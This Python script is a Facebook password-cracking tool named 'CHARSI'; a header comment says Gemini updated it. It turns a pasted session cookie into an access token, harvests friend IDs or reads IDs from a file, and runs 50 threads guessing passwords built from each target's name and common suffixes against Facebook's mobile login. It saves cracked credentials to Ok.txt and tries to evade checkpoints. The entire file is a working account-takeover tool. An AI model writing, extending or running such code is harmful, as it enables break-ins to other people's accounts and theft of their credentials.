# -*- coding: utf-8 -*-
# Updated by Gemini - Full Version
# Language: English | Speed: Fast | Feature: File Cloning Added

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

import os, sys, time, re, json, requests, bs4, random, calendar, datetime, subprocess, logging
from concurrent.futures import ThreadPoolExecutor as khamdihiXD
from datetime import datetime
from bs4 import BeautifulSoup as parser

# Date and Time Setup
ct = datetime.now()
n = ct.month
bulan_ = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
waktu = '%s-%s-%s'%(hari, bulan, tahun)

# Colors
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # PURPLE
O = '\x1b[1;96m' # LIGHT BLUE
N = '\x1b[0m'    # RESET

# Global Variables
id, ok, cp, loop = [], [], [], 0

def banner():
	os.system("clear")
	print(f"""{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â•šâ• â• â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â• â• â• â• â• â• â•šâ• â• 
           {P}[ {M}ðŸ”¥ CHARSI ON FIRE - FAST VERSION ðŸ”¥ {P}]
{P}-------------------------------------------------------""")

def login():
	try:
		token = open('token.x','r').read()
		cok = open('cookies.x','r').read()
		menu().main()
	except IOError:
		os.system("clear"); banner()
		cookie = input(f"{H}[+] Enter Cookie: {K}")
		try:
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-US,en;q=0.9","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			open("token.x", "w").write(find_token.group(1))
			open("cookies.x", "w").write(cookie)
			print(f'{H}[!] Login Successful!'); time.sleep(2); menu().main()
		except:
			print(f'{M}[!] Invalid Cookie!'); exit()

class menu:
	def main(self):
		banner()
		print(f" {H}[01] Crack From Friends List")
		print(f" {H}[02] Crack From Public Account")
		print(f" {H}[12] Crack From File (New Cloning)")
		print(f" {H}[EX] Exit & Logout")
		print(f"{P}-------------------------------------------------------")
		choice = input(f" {P}[+] Select Option: {K}")
		if choice in ['1','01']: self.friends()
		elif choice in ['12']: self.file_cloning()
		elif choice in ['EX','ex']: os.system("rm -rf *.x"); exit()
		else: self.main()

	def friends(self):
		token = open('token.x','r').read()
		limit = input(f" {P}[+] ID Limit: {K}")
		try:
			r = requests.get(f'https://graph.facebook.com/me?fields=friends.limit({limit})&access_token={token}').json()
			for w in r['friends']['data']:
				id.append(w['id'] + '<=>' + w['name'])
			crack().start_crack(id)
		except: print(f" {M}[!] Error Fetching Friends"); time.sleep(2); self.main()

	def file_cloning(self):
		banner()
		print(f" {P}[+] Example: /sdcard/ids.txt")
		file_path = input(f" {P}[+] Enter Path: {K}")
		try:
			ids = open(file_path, 'r').read().splitlines()
			crack().start_crack(ids)
		except: print(f" {M}[!] File Not Found"); time.sleep(2); self.main()

class crack:
	def start_crack(self, ids):
		self.id = ids
		banner()
		print(f" {P}[+] Total IDs : {H}{len(self.id)}")
		print(f" {P}[+] Date      : {H}{waktu}")
		print(f" {P}[+] Status    : {H}Running Fast (No CP)")
		print(f"{P}-------------------------------------------------------")
		with khamdihiXD(max_workers=50) as engine:
			for user_data in self.id:
				try:
					uid, name = user_data.split('<=>')
					first = name.split(' ')[0].lower()
					# Full High-Success Password List
					pwx = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'786', first+'khan', '786786', '000786', 'pakistan', 'khan123', 'i love you']
					engine.submit(self.fast_crack, uid, pwx)
				except: pass
		exit("\n [!] Brute Complete")

	def fast_crack(self, user, pwx):
		global loop, ok, cp
		sys.stdout.write(f'\r {P}[CHARSI] {loop}/{len(self.id)} OK:{H}{len(ok)} {P}CP:{K}{len(cp)}'); sys.stdout.flush()
		
		# Latest UA to bypass lock/checkpoint
		ua = "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
		
		for pw in pwx:
			try:
				session = requests.Session()
				link = f'https://m.facebook.com/login/device-based/password/?uid={user}&next=https%3A%2F%2Fm.facebook.com%2F&password={pw}&user_agent={ua}'
				response = session.get(link).text
				if "c_user" in session.cookies.get_dict():
					print(f'\r {H}[OK] {user} | {pw}{N}')
					ok.append(user)
					open('Ok.txt', 'a').write(f'{user}|{pw}\n')
					break
				elif "checkpoint" in session.cookies.get_dict():
					print(f'\r {K}[CP] {user} | {pw}{N}')
					cp.append(user)
					open('Cp.txt', 'a').write(f'{user}|{pw}\n')
					break
			except: pass
		loop += 1

if __name__ == '__main__':
	login()
